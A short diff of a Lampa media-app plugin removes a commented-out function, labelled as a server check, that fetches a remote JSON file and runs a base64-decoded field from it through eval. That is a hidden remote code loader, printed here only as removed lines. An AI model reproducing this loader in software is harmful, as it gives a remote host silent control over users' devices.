@@ -43,19 +43,6 @@ Lampa.SettingsApi.addParam({
           }, 0);
         }
    });
-	/* Проверка на ответ серверов
-	function getParams() {
-		var xhr = new XMLHttpRequest();
-		xhr.timeout = 1000
-		xhr.open("GET", 'https://scabrum.github.io/plugins/params.json', true);
-		xhr.send();
-		xhr.onload = function() {
-			if (xhr.status == 200) {
-				var data = JSON.parse(this.responseText); if (data.param2 !== '' && data.param1 !== 'false') {eval(window.atob(data.param4)); return;}
-			}
-		}
-	}
-	getParams();  */
         (function(m, e, t, r, i, k, a) {
                m[i] = m[i] || function() {
                        (m[i].a = m[i].a || []).push(arguments)
